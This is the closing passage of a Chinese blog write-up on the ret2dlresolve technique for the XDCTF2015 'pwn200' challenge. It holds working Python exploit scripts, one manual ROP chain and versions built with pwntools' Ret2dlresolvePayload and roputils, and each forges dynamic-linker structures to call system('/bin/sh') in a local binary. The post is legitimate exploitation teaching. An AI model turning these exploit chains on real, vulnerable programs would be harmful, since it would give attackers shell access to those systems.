class="number">16</span></span><br><span class="line">fake_dynsym_addr = fake_rel_addr + <span class="number">8</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_dynsym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_dynsym_addr = fake_dynsym_addr + align</span><br><span class="line">index_dynsym = (fake_dynsym_addr - dynsym)/<span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">fake_rel = flat([write_got, r_info])</span><br><span class="line">reloc_offset = fake_rel_addr - rel_plt</span><br><span class="line"></span><br><span class="line">fake_name_addr = fake_dynsym_addr +<span class="number">16</span></span><br><span class="line">st_name = fake_name_addr - dynstr</span><br><span class="line">fake_sym = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])</span><br><span class="line"></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(reloc_offset)</span><br><span class="line">rop.raw(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(binsh_addr)</span><br><span class="line">rop.raw(fake_rel)</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span>*align)</span><br><span class="line">rop.raw(fake_sym)</span><br><span class="line">rop.raw(<span class="string">&#x27;system\x00&#x27;</span>) <span class="comment">#需要\x00作为字符串结尾</span></span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line"></span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>注意：第三十二行，”/bin/sh”的偏移原本为80，这里多加2是因为pwntools会自动帮你对齐字符串<br>下图（偏移设为80时）可以看到（但我还不知道具体原因。。）<br><img src = 'https://i.bmp.ovh/imgs/2021/03/7206d72df037a1f6.png' /></p>
<h4 id="exp2-dlresolve"><a href="#exp2-dlresolve" class="headerlink" title="exp2-dlresolve"></a>exp2-dlresolve</h4><p>pwntools 内部集成了 Ret2dlresolvePayload 工具<br>Ret2dlresolvePayload，第一个参数是目标文件的 ELF 对象，第二个是想要解析的函数名，第三个是函数参数<br>官方的例子如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get(<span class="string">&#x27;i386&#x27;</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rop = ROP(context.binary)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&quot;system&quot;</span>, args=[<span class="string">&quot;echo pwned&quot;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rop.read(<span class="number">0</span>, dlresolve.data_addr) <span class="comment"># do not forget this step, but use whatever function you like</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rop.ret2dlresolve(dlresolve)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>raw_rop = rop.chain()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(rop.dump())</span><br><span class="line"><span class="number">0x0000</span>:        <span class="number">0x80482e0</span> read(<span class="number">0</span>, <span class="number">0x804ae00</span>)</span><br><span class="line"><span class="number">0x0004</span>:        <span class="number">0x80484ea</span> &lt;adjust @<span class="number">0x10</span>&gt; pop edi; pop ebp; ret</span><br><span class="line"><span class="number">0x0008</span>:              <span class="number">0x0</span> arg0</span><br><span class="line"><span class="number">0x000c</span>:        <span class="number">0x804ae00</span> arg1</span><br><span class="line"><span class="number">0x0010</span>:        <span class="number">0x80482d0</span> [plt_init] system(<span class="number">0x804ae24</span>)</span><br><span class="line"><span class="number">0x0014</span>:           <span class="number">0x2b84</span> [dlresolve index]</span><br><span class="line"><span class="number">0x0018</span>:          <span class="string">b&#x27;gaaa&#x27;</span> &lt;<span class="keyword">return</span> address&gt;</span><br><span class="line"><span class="number">0x001c</span>:        <span class="number">0x804ae24</span> arg0</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = elf.process()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.sendline(fit(&#123;<span class="number">64</span>+context.<span class="built_in">bytes</span>*<span class="number">3</span>: raw_rop, <span class="number">200</span>: dlresolve.payload&#125;))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.recvline()</span><br><span class="line"><span class="string">b&#x27;pwned\n&#x27;</span></span><br></pre></td></tr></table></figure>
<p>攻击脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary = elf = ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">rop = ROP(context.binary）</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">io = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">payload = flat(&#123;<span class="number">112</span>:raw_rop,<span class="number">256</span>:dlresolve.payload&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="roputils"><a href="#roputils" class="headerlink" title="roputils"></a>roputils</h3><p><a target="_blank" rel="noopener" href="https://github.com/inaz2/roputils/tree/master/examples">https://github.com/inaz2/roputils/tree/master/examples</a></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">r = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>关于dl_resolve_call与dl_resolve_data的细节可以查看源码，主要就是帮我们把之前手动构造的参数都构造好了。且dl_resolve 执行完之后也是需要有对应的返回地址的<br>需要填写的部分：</p>
<ul>
<li>dl_resolve_call的两个参数分别是开始布置dlresolve的地址和参数的地址</li>
<li>dl_resolve_data的两个参数分别是开始布置dlresolve的地址和函数名称的地址<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1></li>
</ul>
<ol>
<li><a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/linux/stackoverflow/advanced-rop-zh/">https://wiki.x10sec.org/pwn/linux/stackoverflow/advanced-rop-zh/</a></li>
<li><a target="_blank" rel="noopener" href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></li>
<li><a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/ret2dl_resolve_analysis#64%E4%BD%8Delf%E7%A8%8B%E5%BA%8F%E7%9A%84ret2dl_resolve">https://ray-cp.github.io/archivers/ret2dl_resolve_analysis#64%E4%BD%8Delf%E7%A8%8B%E5%BA%8F%E7%9A%84ret2dl_resolve</a></li>
<li><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2019/12/01/Ret2runtime_dlresolve/">https://wzt.ac.cn/2019/12/01/Ret2runtime_dlresolve/</a></li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">aYoung</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://iamayoung.xyz/2021/03/02/ret2dlresolve/">https://iamayoung.xyz/2021/03/02/ret2dlresolve/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://iamayoung.xyz" target="_blank">aYoung's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/pwn/">pwn'</a></div><div class="post_share"><div class="social-share" data-image="https://ftp.bmp.ovh/imgs/2021/03/9be0b7033e8d5f01.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/07/%E3%80%90WP%E3%80%91HITCON-Training-lab8/"><img class="prev-cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【WP】HITCON-Training-lab8</div></div></a></div><div class="next-post pull-right"><a href="/2021/02/23/%E3%80%90WP%E3%80%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E4%B9%8Bpwn200/"><img class="next-cover" src="https://i.bmp.ovh/imgs/2021/01/c9d08fbaeb1fe8f9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【WP】攻防世界之pwn200</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/08/【WP】BUUCTF之not_the_same_3dsctf_2016/" title="【WP】BUUCTF之not_the_same_3dsctf_2016"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/01/c580c803fd53c030.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-08</div><div class="title">【WP】BUUCTF之not_the_same_3dsctf_2016</div></div></a></div><div><a href="/2021/01/15/【WP】BUUCTF之【BlackWatch入群题】PWN/" title="【WP】BUUCTF之【BlackWatch入群题】PWN"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/01/c580c803fd53c030.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-15</div><div class="title">【WP】BUUCTF之【BlackWatch入群题】PWN</div></div></a></div><div><a href="/2021/03/31/【WP】HITCON-Training-lab10/" title="【WP】HITCON-Training-lab10"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-31</div><div class="title">【WP】HITCON-Training-lab10</div></div></a></div><div><a href="/2021/03/07/【WP】HITCON-Training-lab8/" title="【WP】HITCON-Training-lab8"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-07</div><div class="title">【WP】HITCON-Training-lab8</div></div></a></div><div><a href="/2021/01/12/【WP】adworld之pwn新手区string/" title="【WP】adworld之pwn新手区string"><img class="cover" src="https://i.bmp.ovh/imgs/2021/01/7acaece6c5ada24b.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-12</div><div class="title">【WP】adworld之pwn新手区string</div></div></a></div><div><a href="/2021/03/10/【WP】HITCON-Training-lab9/" title="【WP】HITCON-Training-lab9"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-10</div><div class="title">【WP】HITCON-Training-lab9</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://ftp.bmp.ovh/imgs/2020/12/e087cb4981dcab3d.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">aYoung</div><div class="author-info__description">aYoung的博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aYoung-CS"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/aYoung-CS" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">好好学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.</span> <span class="toc-text">ELF程序的基本相关结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%AF%B9read%E5%87%BD%E6%95%B0%E7%9A%84%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">总结对read函数的解析过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.3.</span> <span class="toc-text">延迟绑定过程详解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-dl-fixup%E5%87%BD%E6%95%B0%E5%8A%9F%E8%83%BD"><span class="toc-number">1.4.</span> <span class="toc-text">总结_dl_fixup函数功能</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%9E%84%E9%80%A0"><span class="toc-number">3.1.</span> <span class="toc-text">手动构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stage1"><span class="toc-number">3.1.1.</span> <span class="toc-text">stage1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage2"><span class="toc-number">3.1.2.</span> <span class="toc-text">stage2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage3"><span class="toc-number">3.1.3.</span> <span class="toc-text">stage3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage4"><span class="toc-number">3.1.4.</span> <span class="toc-text">stage4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage5"><span class="toc-number">3.1.5.</span> <span class="toc-text">stage5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stage6"><span class="toc-number">3.1.6.</span> <span class="toc-text">stage6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">3.2.</span> <span class="toc-text">利用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntools"><span class="toc-number">3.2.1.</span> <span class="toc-text">pwntools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp1-rop"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">exp1-rop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp2-dlresolve"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">exp2-dlresolve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#roputils"><span class="toc-number">3.2.2.</span> <span class="toc-text">roputils</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/06/07/%E3%80%90WP%E3%80%91how2heap%E4%B9%8BHouse-Of-Einherjar/" title="【WP】how2heap之House-Of-Einherjar"><img src="https://ae01.alicdn.com/kf/U01d4ba5a6f0a460496eb5cc2ca9599b7E.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】how2heap之House-Of-Einherjar"/></a><div class="content"><a class="title" href="/2021/06/07/%E3%80%90WP%E3%80%91how2heap%E4%B9%8BHouse-Of-Einherjar/" title="【WP】how2heap之House-Of-Einherjar">【WP】how2heap之House-Of-Einherjar</a><time datetime="2021-06-07T08:59:04.000Z" title="发表于 2021-06-07 16:59:04">2021-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/06/%E3%80%90WP%E3%80%91Null-Byte%E6%BA%A2%E5%87%BA/" title="【WP】Null-Byte溢出"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】Null-Byte溢出"/></a><div class="content"><a class="title" href="/2021/06/06/%E3%80%90WP%E3%80%91Null-Byte%E6%BA%A2%E5%87%BA/" title="【WP】Null-Byte溢出">【WP】Null-Byte溢出</a><time datetime="2021-06-06T15:35:24.000Z" title="发表于 2021-06-06 23:35:24">2021-06-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/02/%E5%88%9D%E8%AF%86IO-FILE/" title="初识IO_FILE"><img src="https://ftp.bmp.ovh/imgs/2021/06/095ee07e7b43b96b.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="初识IO_FILE"/></a><div class="content"><a class="title" href="/2021/06/02/%E5%88%9D%E8%AF%86IO-FILE/" title="初识IO_FILE">初识IO_FILE</a><time datetime="2021-06-02T14:54:33.000Z" title="发表于 2021-06-02 22:54:33">2021-06-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/31/%E3%80%90WP%E3%80%91%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9BPwn/" title="【WP】宁波市赛Pwn"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】宁波市赛Pwn"/></a><div class="content"><a class="title" href="/2021/05/31/%E3%80%90WP%E3%80%91%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9BPwn/" title="【WP】宁波市赛Pwn">【WP】宁波市赛Pwn</a><time datetime="2021-05-31T11:36:51.000Z" title="发表于 2021-05-31 19:36:51">2021-05-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/31/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-7/" title="how2heap学习笔记-7"><img src="https://ae01.alicdn.com/kf/U01d4ba5a6f0a460496eb5cc2ca9599b7E.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap学习笔记-7"/></a><div class="content"><a class="title" href="/2021/05/31/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-7/" title="how2heap学习笔记-7">how2heap学习笔记-7</a><time datetime="2021-05-31T02:11:05.000Z" title="发表于 2021-05-31 10:11:05">2021-05-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By aYoung</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: 'L7cFgIQhurvmmSexryctex39-MdYXbMMI',
      appKey: 'EG1BbRP3FTdnTfn0QeeeIDii',
      placeholder: 'Please leave your footprints',
      avatar: 'robohash',
      meta: 'nick/mail/link'.split(','),
      pageSize: '10',
      avatar_cdn: 'https://www.gravatar.com/avatar/',
      lang: 'zh-CN',
      recordIP: true,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: true,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick/mail'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign(initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>